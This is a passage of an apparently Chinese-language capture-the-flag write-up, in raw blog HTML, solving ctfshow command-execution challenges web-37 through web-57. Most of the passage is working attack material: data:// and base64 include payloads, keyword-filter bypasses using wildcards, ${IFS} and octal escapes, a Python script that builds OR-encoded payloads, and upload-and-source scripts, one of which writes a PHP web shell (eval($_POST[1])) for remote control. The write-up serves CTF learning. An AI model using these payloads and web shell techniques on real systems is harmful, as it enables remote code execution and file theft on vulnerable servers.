class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log<br></code></pre></td></tr></table></figure><h2 id="web-37（data-伪协议、base64加密）"><a href="#web-37（data-伪协议、base64加密）" class="headerlink" title="web-37（data:&#x2F;&#x2F;伪协议、base64加密）"></a>web-37（data:&#x2F;&#x2F;伪协议、base64加密）</h2><p><img src="/../image/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-6.png"></p><p>这里eval换成了include，很明显要用文件包含，但是过滤了flag关键字，所以可以使用文件包含<strong>data:&#x2F;&#x2F;协议</strong>，将我们的代码通过base64加密后再输入，这样就能绕过flag关键字过滤了</p><p>语法为data:&#x2F;&#x2F;text&#x2F;plain;base64,代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br><br>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==即为<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag,php&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web-38（同上题）"><a href="#web-38（同上题）" class="headerlink" title="web-38（同上题）"></a>web-38（同上题）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-7.png"></p><p>比上题多过滤了个php和file关键字，使用上题的payload即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/</span>Pg==<br></code></pre></td></tr></table></figure><h2 id="web-39（data-伪协议）"><a href="#web-39（data-伪协议）" class="headerlink" title="web-39（data:&#x2F;&#x2F;伪协议）"></a>web-39（data:&#x2F;&#x2F;伪协议）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-8.png"></p><p>源码会在我们的$c后拼接一个’.php’，但是拼接的php可以不用管,include只会处理<code>&lt;?php ?&gt;</code>内部的内容</p><p>但是这里试了一下好像不能用base64加密绕过了，所以使用模糊匹配绕过关键字过滤</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac fla*&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="web-40（无参数RCE绕过、scandir文件读取）"><a href="#web-40（无参数RCE绕过、scandir文件读取）" class="headerlink" title="web-40（无参数RCE绕过、scandir文件读取）"></a>web-40（无参数RCE绕过、scandir文件读取）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-9.png"></p><p>看到题目被吓到了以为过滤了小括号，结果发现是中文括号，这里可以使用无参数RCE绕过或者scandir()文件读取都行</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">无参数RCE<br>?c=<span class="hljs-keyword">eval</span>(end(<span class="hljs-keyword">pos</span>(get_defined_vars())));&amp;cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br><br>或者<br><br>scandir()文件读取<br>首先，查看当前目录下文件<br>print_r(scandir(current(localeconv())));<br>发现flag.php在第二位，直接show_source读取<br>show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(current(localeconv())))));<br></code></pre></td></tr></table></figure><h2 id="web-41（无字母数字或运算绕过）"><a href="#web-41（无字母数字或运算绕过）" class="headerlink" title="web-41（无字母数字或运算绕过）"></a>web-41（无字母数字或运算绕过）</h2><p>这题不会直接看的题解</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">对于&#x27;/[0-9]|<span class="hljs-string">[a-z]</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\~</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\]</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\&#125;</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\-/i&#x27;</span><br></code></pre></td></tr></table></figure><p>该正则表达式的含义是：它会匹配任意一个数字字符、小写字母、”^”、”+”、”~”、”$”、”[“、”]”、”{“、”}”、”&amp;” 或 “-“，并且在匹配时忽略大小写。可以说过滤了大部分绕过方式，但是还剩下”|”没有过滤。所以这道题的目的就是要我们使用ascii码为0-255中没有被过滤的字符进行或运算，从而得到被绕过的字符。</p><p>思路如下：</p><ul><li>首先对ascii从0-255所有字符中筛选出未被过滤的字符，然后两两进行或运算，存储结果。</li><li>跟据题目要求，构造payload的原型，并将原型替换为或运算的结果</li><li>使用POST请求发送c,获取flag</li></ul><p><strong>一体化脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">import</span> requests<br><br>contents = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        hex_i = <span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)<br>        hex_j = <span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(j)<br>        preg = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;[0-9]|[a-z]|\^|\+|~|\$|\[|]|\&#123;|&#125;|&amp;|-&#x27;</span>, re.I)<br>        <span class="hljs-keyword">if</span> preg.search(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex_i, <span class="hljs-number">16</span>))) <span class="hljs-keyword">or</span> preg.search(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex_j, <span class="hljs-number">16</span>))):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            a = <span class="hljs-string">&#x27;%&#x27;</span> + hex_i<br>            b = <span class="hljs-string">&#x27;%&#x27;</span> + hex_j<br>            c = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>:], <span class="hljs-number">16</span>) | <span class="hljs-built_in">int</span>(b[<span class="hljs-number">1</span>:], <span class="hljs-number">16</span>))<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= <span class="hljs-built_in">ord</span>(c) &lt;= <span class="hljs-number">126</span>:<br>                contents.append([c, a, b])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_payload</span>(<span class="hljs-params">cmd</span>):<br>    payload1 = <span class="hljs-string">&#x27;&#x27;</span><br>    payload2 = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cmd:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> contents:<br>            <span class="hljs-keyword">if</span> i == j[<span class="hljs-number">0</span>]:<br>                payload1 += j[<span class="hljs-number">1</span>]<br>                payload2 += j[<span class="hljs-number">2</span>]<br>                <span class="hljs-keyword">break</span><br>    payload = <span class="hljs-string">&#x27;(&quot;&#x27;</span> + payload1 + <span class="hljs-string">&#x27;&quot;|&quot;&#x27;</span> + payload2 + <span class="hljs-string">&#x27;&quot;)&#x27;</span><br>    <span class="hljs-keyword">return</span> payload<br><br><br>URL = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;url:&#x27;</span>)<br>payload = make_payload(<span class="hljs-string">&#x27;system&#x27;</span>) + make_payload(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>)<br>response = requests.post(URL, data=&#123;<span class="hljs-string">&#x27;c&#x27;</span>: urllib.parse.unquote(payload)&#125;)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><hr><h2 id="web-42（-绕过-dev-null-2-1命令）"><a href="#web-42（-绕过-dev-null-2-1命令）" class="headerlink" title="web-42（||绕过 &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1命令）"></a>web-42（||绕过 &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1命令）</h2><p>这题给我们的$c后拼接了一个<code>&quot; &gt;/dev/null 2&gt;&amp;1&quot;</code>，该命令让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p><p>这里可以使用<code>||</code>来绕过，这里用%0a和%26都行</p><p><strong>||类似于程序中的if-else语句。若前面的命令执行成功，则后面的命令就不会执行。若前面的命令执行失败，则执行后面的命令</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=cat flag.php||<br></code></pre></td></tr></table></figure><hr><h2 id="web-43（tac）"><a href="#web-43（tac）" class="headerlink" title="web-43（tac）"></a>web-43（tac）</h2><p>比上一题多过滤了个cat和分号，换tac即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac flag.php||<br></code></pre></td></tr></table></figure><hr><h2 id="web-44（-模糊匹配）"><a href="#web-44（-模糊匹配）" class="headerlink" title="web-44（*模糊匹配）"></a>web-44（*模糊匹配）</h2><p>又比上题多过滤了个flag，这里用*号模糊匹配即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac fla*||<br></code></pre></td></tr></table></figure><hr><h2 id="web-45（-09绕过空格过滤、-IFS-）"><a href="#web-45（-09绕过空格过滤、-IFS-）" class="headerlink" title="web-45（%09绕过空格过滤、${IFS}）"></a>web-45（%09绕过空格过滤、${IFS}）</h2><p>比上一题多过滤了个空格，用url编码<code>%09</code>代替空格即可，用<code>$&#123;IFS&#125;</code>也行</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla*||<br></code></pre></td></tr></table></figure><hr><h2 id="web-46（-转义、-转义绕过-号过滤）"><a href="#web-46（-转义、-转义绕过-号过滤）" class="headerlink" title="web-46（?转义、\转义绕过*号过滤）"></a>web-46（?转义、\转义绕过*号过滤）</h2><p>又多过滤了<em>号，*<em>可以用?或者\转义绕过</em></em></p><p><strong>用’’和””空字符绕过也行</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla?.php||<br><br>或者<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac&lt;fla\g.php||<br><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fl&#x27;&#x27;ag.php||<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fl<span class="hljs-string">&quot;&quot;</span>ag.php||<br><br>注意：用了?就不能用重定向符&lt;来绕过空格了<br></code></pre></td></tr></table></figure><hr><h2 id="web-47（同上题）"><a href="#web-47（同上题）" class="headerlink" title="web-47（同上题）"></a>web-47（同上题）</h2><p>又多过滤了一些命令more、less、head、sort、tail，用上一关的payload就行了</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla?.php||<br></code></pre></td></tr></table></figure><hr><h2 id="web-48（同上题）"><a href="#web-48（同上题）" class="headerlink" title="web-48（同上题）"></a>web-48（同上题）</h2><p>还是没过滤tac，一样</p><hr><h2 id="web-49（同上题）"><a href="#web-49（同上题）" class="headerlink" title="web-49（同上题）"></a>web-49（同上题）</h2><p>还是一样</p><hr><h2 id="web-50（"><a href="#web-50（" class="headerlink" title="web-50（&lt;重定向符绕过空格过滤）"></a>web-50（&lt;重定向符绕过空格过滤）</h2><p>依然可以用tac绕过，但是%和制表符被过滤了</p><p>注意：这里过滤了&#x2F;x09即制表符</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac&lt;fl\ag.php||<br></code></pre></td></tr></table></figure><hr><h2 id="web-51（nl、"><a href="#web-51（nl、" class="headerlink" title="web-51（nl、&lt;重定向符）"></a>web-51（nl、&lt;重定向符）</h2><p>这题过滤了tac和%，用nl和&lt;绕过就行了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=nl&lt;fl\ag.php||<br></code></pre></td></tr></table></figure><hr><h2 id="web-52（-IFS-绕过空格过滤）"><a href="#web-52（-IFS-绕过空格过滤）" class="headerlink" title="web-52（${IFS}绕过空格过滤）"></a>web-52（${IFS}绕过空格过滤）</h2><p>这题把&lt;给过滤了，但是没过滤字母和$符号以及大括号，所以能用${IFS}代替空格</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span><span class="hljs-variable">$&#123;IFS&#125;</span>fl\ag.php||<br></code></pre></td></tr></table></figure><hr><h2 id="web-53（同上）"><a href="#web-53（同上）" class="headerlink" title="web-53（同上）"></a>web-53（同上）</h2><p>一样用$IFS即可</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=nl<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl\ag.php<br>或者<br><span class="hljs-string">?c</span>=ta<span class="hljs-string">&#x27;&#x27;</span>c<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl\ag.php<br></code></pre></td></tr></table></figure><hr><h2 id="web-54（通过命令路径使用cat命令、rev）"><a href="#web-54（通过命令路径使用cat命令、rev）" class="headerlink" title="web-54（通过命令路径使用cat命令、rev）"></a>web-54（通过命令路径使用cat命令、rev）</h2><p>这里用了</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">|<span class="hljs-type">.*c</span>.*a.*t.*|<span class="hljs-type">这种匹配方式</span><br><span class="hljs-type">匹配包含字符 c</span>、a、t 的任意顺序的字符串，例如 cat、cbaat 等<br></code></pre></td></tr></table></figure><p>所以可以这样绕过，通过命令路径来使用cat命令（linux路径下万物皆文件）</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/ca</span>?<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;f?<span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><br>或者<br><span class="hljs-string">?c</span>=rev<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fla?.php<br>输出出来是反转的<br></code></pre></td></tr></table></figure><hr><h2 id="web-55（无字母base64-通配符、-usr-bin-bzip2压缩命令、bash-shell转义字符）"><a href="#web-55（无字母base64-通配符、-usr-bin-bzip2压缩命令、bash-shell转义字符）" class="headerlink" title="web-55（无字母base64+通配符、&#x2F;usr&#x2F;bin&#x2F;bzip2压缩命令、bash shell转义字符）"></a>web-55（无字母base64+通配符、&#x2F;usr&#x2F;bin&#x2F;bzip2压缩命令、bash shell转义字符）</h2><p>由于过滤了字母，但没有过滤数字，我们尝试使用&#x2F;bin目录下的可执行程序。</p><p>但因为字母不能传入，我们需要使用通配符?来进行代替</p><p><strong>base64+通配符</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/base</span>64 flag.php<br>替换为<br><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">64</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br></code></pre></td></tr></table></figure><p><strong>&#x2F;usr&#x2F;bin&#x2F;bzip2压缩命令，将flag.php压缩为压缩包，访问并下载</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">2</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br>即/usr/bin/bzip2 flag.php<br>把flag.php给压缩，然后访问url+flag.php.bz2就可以把压缩后的flag.php给下载下来。<br></code></pre></td></tr></table></figure><p><strong>bash shell的转义字符</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Bash shell中，\是转义字符的开始。当你使用\后跟一个数字时，Bash会将其解释为八进制数，并将其转换为对应的ASCII字符。<br><br>可通过 <span class="hljs-variable">$</span><span class="hljs-string">&#x27;[转义字符]&#x27;</span>构造命令。<br><br>payload:<br>?c=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;\154\163&#x27;</span>    <span class="hljs-built_in">ls</span><br>?c=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;\143\141\164&#x27;</span>%<span class="hljs-number">20</span>*    <span class="hljs-built_in">cat</span> *<br></code></pre></td></tr></table></figure><p>这里也可以用文件上传加读取</p><p>先构造一个文件上传的POST数据包；</p><p>二：PHP页面生成临时文件phpXXXXXX，存储在&#x2F;tmp目录下；</p><p>三：执行指令.&#x2F;???&#x2F;??????[@-[]，读取文件执行其中指令；</p><p>用python脚本直接完成，也可以写个表单去上传都行</p><p>先使用python脚本上传文件并访问，这样就能生成一个shell.php文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">import</span> requests<br><br>url2 = <span class="hljs-string">&#x27;http://03b01a20-43d6-439e-b60d-6bb746c9332f.challenge.ctf.show/?c=.+/???/????????[@-[]&#x27;</span><br><span class="hljs-keyword">file</span> = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;mixbp.txt&quot;</span>,<span class="hljs-string">&quot;echo &#x27;&lt;?php eval($_POST[1]);&#x27; &gt; shell.php&quot;</span>)&#125;<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:<br>    r = requests.post(url=url2,files=<span class="hljs-keyword">file</span>)<br></code></pre></td></tr></table></figure><p>然后用蚁剑连接即可</p><p>或者直接输出答案到python</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;http://25a61f1e-6750-49d2-a671-7bce2a18c52b.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;</span><br>    r = requests.post(url, files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;mixbp.txt&#x27;</span>,<span class="hljs-string">&#x27;cat flag.php&#x27;</span>)&#125;)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ctfshow&quot;</span> <span class="hljs-keyword">in</span> r.<span class="hljs-built_in">text</span>:<br>        print(r.<span class="hljs-built_in">text</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-56（无字母数字RCE）"><a href="#web-56（无字母数字RCE）" class="headerlink" title="web-56（无字母数字RCE）"></a>web-56（无字母数字RCE）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>无字母数字RCE</p><p>过滤了字母数字，%号，杜绝取反和异或；$，杜绝转义，看了其他大神的wp，总结出下面的方法：</p><p>可以通过POST上传一个文件，文件中包含命令，通过source命令（.）来执行命令，该文件在linux下面保存在 <strong>&#x2F;tmp&#x2F;php??????</strong> ，后六个字符为随机生成的大小写，可使用linux匹配符去匹配。</p><p>可以通过构造post上传文件的数据包，或者使用python脚本：</p><p>（1）数据包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;[传参网站]&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>传入参数 <strong>?c&#x3D;.%20&#x2F;???&#x2F;????????[@-[]</strong></p><p>在文件内容中写入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> /var/www/html/falg.php<br></code></pre></td></tr></table></figure><p>2）python脚本</p><p>同样的思路。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;[自定义网站]/?c=.+/???/????????[@-[]&quot;</span><br>    r = requests.post(url, files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;feng.txt&#x27;</span>, <span class="hljs-string">b&#x27;cat flag.php&#x27;</span>)&#125;)<br>    <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&quot;flag&quot;</span>) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(r.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web-57（无数字字母RCE构造数字）"><a href="#web-57（无数字字母RCE构造数字）" class="headerlink" title="web-57（无数字字母RCE构造数字）"></a>web-57（无数字字母RCE构造数字）</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td 